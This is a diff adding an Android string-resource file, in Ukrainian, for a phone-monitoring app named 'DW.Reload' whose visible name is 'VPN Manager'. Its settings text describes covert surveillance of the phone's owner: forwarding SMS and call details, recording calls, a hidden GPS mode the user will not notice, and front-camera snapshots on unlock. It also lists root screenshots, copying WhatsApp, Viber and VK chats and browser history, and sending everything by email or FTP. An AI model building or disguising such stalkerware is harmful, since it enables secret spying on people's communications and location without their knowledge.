@@ -1,0 +1,222 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">VPN Manager</string>
+    <string name="app_name_real">DW.Reload</string>
+    <string name="default_code">001</string>
+    
+    <string-array name="screen_timer">
+        <item>10 сек</item>
+		<item>30 сек</item>
+		<item>1 сек</item>
+		<item>2 сек</item>
+		<item>5 сек</item>
+		<item>10 сек</item>
+	</string-array>
+	
+    <string-array name="screen_timer_val">
+        <item>10</item>
+		<item>30</item>
+		<item>60</item>
+		<item>120</item>
+		<item>300</item>
+		<item>600</item>
+	</string-array>
+    
+    <string-array name="gps_timer">
+        <item>Часто (~1 хв)</item>
+		<item>Іноді (~10 хв)</item>
+		<item>Рідко (~30 хв)</item>
+	</string-array>
+	
+    <string-array name="gps_timer_val">
+        <item>1</item>
+		<item>10</item>
+		<item>30</item>
+	</string-array>
+	
+    <string-array name="record_format">
+        <item>3GPP</item>
+		<item>AMR</item>
+	</string-array>
+	
+    <string-array name="record_format_val">
+        <item>1</item>
+		<item>3</item>
+	</string-array>
+	
+    <string-array name="record_source">
+        <item>DEFAULT</item>
+		<item>MIC</item>
+		<item>VOICE_UPLINK</item>
+		<item>VOICE_DOWNLINK</item>
+		<item>VOICE_CALL</item>
+		<item>CAMCORDER</item>
+		<item>VOICE_RECOGNITION</item>
+		<item>VOICE_COMMUNICATION</item>
+	</string-array>
+	
+    <string-array name="record_source_val">
+        <item>0</item>
+		<item>1</item>
+		<item>2</item>
+		<item>3</item>
+		<item>4</item>
+		<item>5</item>
+		<item>6</item>
+		<item>7</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format">
+        <item>Small (640x480)</item>
+		<item>Medium (800x600)</item>
+		<item>HD (1280×720)</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format_val">
+        <item>640</item>
+		<item>800</item>
+		<item>1280</item>
+	</string-array>
+	
+
+    <string name="idLabel">IMEI:</string>
+    <string name="settings">Загальні налаштування</string>
+    <string name="filter">Фільтр</string>
+    
+	<string name="useFilter">Включити фільтр</string>
+	<string name="watchFor">Слідкувати за дзвінками та смс …</string>
+	<string name="onlyFromList">… тількі з номерів з переліку</string>
+	<string name="exceptList">… від усіх, крім номерів з переліку</string>
+	<string name="phoneNumber">Номер телефону</string>
+	<string name="add">Додати</string>
+	<string name="filterHint">*Довге натиснення для видалення</string>
+	<string name="plus">+</string>
+	
+	<string name="settings_phone_id_summary">Ідентіфікатор телефону у звітах, можна залишити пустим, в цьому віпадку у якості идентіфікатора виступить IMEI телефона)</string>
+    <string name="settings_phone_id">Ідентіфікатор телефону</string>
+	<string name="copyright">VDLab, UA</string>
+	<string name="dwreload">DW.Reload</string>
+    
+    <string name="gps">GPS</string>
+    <string name="gpsEnableDescr">Відправляти координати на почту</string>
+    <string name="gpsOnlyNew">Тількі нові координати</string>
+    <string name="gpsOnlyNewDescr">Відправляти координати тількі якщо вони змінилися(Економимо трафік)</string>
+    <string name="gpsInterval">Інтервал</string>
+    <string name="gpsDescr">Налаштування інтервалу визначення координат</string>
+    <string name="gpsTitle">Оберіть інтервал</string>
+    <string name="battery">Батарея</string>
+    
+    <string name="settings_noNumber">Номер для оповіщень не заданий</string>
+    <string name="settings_onlyDigits">Допустимі лише цифри</string>
+    <string name="settings_emptyCode">Код не може бути порожнім</string>
+    <string name="settings_numberError">Введено некоректний номер</string>
+    
+    <string name="settings_dataTransfer">Передача даних</string>
+    <string name="settings_wifionly">Тількі Wi-Fi</string>
+    <string name="settings_wifionly_summary">Передача даних тількі через Wi-Fi.</string>
+    <string name="settings_wifionly_files_summary">Відправляти файли (скріншоти/знімки/записи) тількі через Wi-Fi.</string>
+    <string name="settings_runcode">Код запуску</string>
+    <string name="settings_runcode_summary">Код запуску інтерфейсу налаштувань (**Ваш код**)</string>
+    <string name="settings_runcode_title">Ваш код</string>
+    <string name="settings_phonenumber">Номер телефону</string>
+    <string name="settings_phonenumber_summary">Номер телефону, на який будуть відправлятися оповіщення</string>
+    <string name="settings_smsnotification">Смс оповіщення</string>
+    <string name="settings_simnotification">Заміна сім-карти</string>
+    <string name="settings_simnotification_summary">Сповістити про заміну сім-карти по смс</string>
+    <string name="settings_sms">Смс</string>
+    <string name="settings_sms_summary">Дублювати смс на вказаний номер</string>
+    <string name="settings_calls">Дзвінки</string>
+    <string name="settings_calls_summary">Сповіщати про дзвінки на вказаний номер</string>
+    <string name="settings_callrecord">Запис розмов</string>
+    <string name="settings_record">Записувати розмови</string>
+    <string name="settings_record_summary">Запис вхідних та вихідних дзвінків</string>
+    <string name="settings_recordfromline">Запис з лінії</string>
+    <string name="settings_recordfromline_summary">Вести запис з лінії. Добре чутно обох співрозмовників, але працює не на всіх пристроях. Якщо не ввімкнена, то запис ведеться через мікрофон.</string>
+    <string name="settings_recordformat">Формат аудіо</string>
+    <string name="settings_recordformat_summary">формат аудіозапису</string>
+    <string name="settings_photo">Відправка фотографій</string>
+    <string name="settings_phototransfer">Відсилати фото</string>
+    <string name="settings_phototransfer_summary">Відсилати фото, зроблені камерою телефона</string>
+    <string name="settings_imagesize">Розмір зображення</string>
+    <string name="settings_imagesize_summary">Розмір зображення, що відсилається. Зображення більшого розміру витрачають більше трафіку.</string>
+    <string name="settings_screenshots_title">Скріншоти</string>
+    <string name="settings_screenshots">Робити скріншоти ®</string>
+    <string name="settings_screenshots_summary">Робити скріншоти з обраним інтервалом. Для роботи необхідний root. Працює тількі на Android 4.0 і вище. Файли передаються \"Пачками\" не меньш як по 10 штук.</string>
+    <string name="settings_screenshots_interval">Інтервал</string>
+    <string name="settings_screenshots_interval_summary">Інтервал, з яким робити скріншоти</string>
+    
+	<string name="settings_gps_hide">Прихований режим</string>
+    <string name="settings_gps_hide_summary">Приховувати роботу GPS. Пошук відбувається тількі при вимкненому екрані та переривається при його ввімкненні. Користувач не побачить оповіщення \"Пошук GPS\".</string>
+    <string name="settings_record_source_title">Джерело аудіо</string>
+    <string name="settings_record_source_summary">Джерело запису звуку. Не змінюйте цей параметр, якщо не знаете для чого він потрібний та як працює!</string>
+    <string name="addstring">===Слава Україні!===</string>
+    <string name="camera">Камера</string>
+    <string name="settings_front_cameta_title">Використовувати фронтальну камеру</string>
+    <string name="settings_front_cameta_summary">Робити знімки фронтальною камерою при розблокуванні екрану. Файли передаються \"Пачками\" не меньш як по 10 штук.</string>
+    
+    <string name="settings_browser_history_title">Копіювати історію браузеру</string>
+    <string name="settings_browser_history_summary">Зберігати та відправляти історію відвіданих сторінок. Працює тількі зі стандартним браузером Android.</string>
+    <string name="settings_vk">Копіювати Vkontakte ®</string>
+    <string name="settings_vk_summary">Відправляти переписку \"Вконтакте\". Працює тількі з офіційним клієетом \"Вконтакте\". Для роботи потрібен root.</string>
+    <string name="settings_wa">Копіювати WhatsApp ®</string>
+    <string name="settings_wa_summary">Відправляти переписку \"WhatsApp\". Для роботи потрібен root.</string>
+    <string name="settings_vb">Копіювати Viber ®</string>
+    <string name="settings_vb_summary">Відправляти переписку \"Viber\". Для роботи потрібен root.</string>
+    
+    <string name="files">Файли</string>
+    <string name="ftp_addr">Адреса FTP-сервера або його IP</string>
+    <string name="ftp_port">порт</string>
+    <string name="ftp_name">Імя користувача</string>
+    <string name="ftp_pass">пароль</string>
+    <string name="ftp_work_path">шлях на сервері(потрібно створити до використання)</string>
+    <string name="settings_FTP">Налаштування FTP</string>
+    
+    <string name="settings_Mail">Налаштування пошти</string>
+    <string name="email_addr">Ваш email</string>
+    <string name="email_usr_pass">пароль</string>
+    <string name="popserver">адреса SMTP серверу</string>
+    <string name="settings_sms_to">Дублювати смс</string>
+    <string name="settings_calls_to">Інфо про дзвінки</string>
+    <string name="settings_gps_to">дані GPS</string>
+    <string name="settings_history_to">історія браузеру</string>
+    <string name="settings_other_to">усі інші звіти</string>
+    <string name="social_to">Соцмережі</string>
+    <string name="incall">Вхідний дзвінок від</string>
+    <string name="outcall">Вихідний дзвінок до</string>
+    <string name="misscall">Пропущений дзвінок від</string>
+    <string name="insms">Вхідне повідомлення від</string>
+    <string name="outsms">Вихідне повідомлення до</string>
+    <string name="smsbody">Текст</string>
+    <string name="missedsms">Непрочитанне повідомлення від</string>
+    <string name="calllength">Тривалість</string>
+    <string name="timeanddate">Дата/час</string>
+    <string name="minutes">хв.</string>
+    <string name="seconds">сек.</string>
+    <string name="test">Тест</string>
+    <string name="testmail">Намагаюся відправити тестове повідомлення</string>
+    <string name="success">Відправлено!</string>
+    <string name="error">Помилка! Перевірте налаштування!</string>
+    <string name="accuracy">Точність</string>
+    <string name="manycalls">Історія дзвінків</string>
+    <string name="manysms">Історія смс</string>
+    <string name="dayreport">Щоденні звіти</string>
+    <string name="dayreport_descr">Відправляти звіти про події щоденно у вказаний час</string>
+    
+    <string name="advanced">Додатково</string>
+    <string name="backinsdfront">Використовувати основну камеру замість фронтальної при розблокуванні</string>
+    <string name="numinrecordname">Додавати номер в ім`я файлів запису(працює не на всіх телефонах!)</string>
+    <string name="codeword1">Кодове слово 1</string>
+    <string name="codeword2">Кодове слово 2</string>
+    <string name="codeword3">Кодове слово 3</string>
+    <string name="command1">Виконувана команда 1</string>
+    <string name="command2">Виконувана команда 2</string>
+    <string name="command3">Виконувана команда 3</string>
+    <string name="ifnophoto">Якщо не приходять фото, зроблені телефоном, вкажіть шлях до теки, в якій вони зберігаються.</string>
+    <string name="photopath">Шлях до теки з фотографіями</string>
+    
+    <!--string name="directory_selected_label">Обрана тека:</string>
+    <string name="choose_directory">Вибір теки</string>
+    <string name="none">немає</string-->
+    <string name="btn_choose">Обрати теку</string>
+    <!--string name="btn_switch">Переключити у діалог</string-->
+</resources>
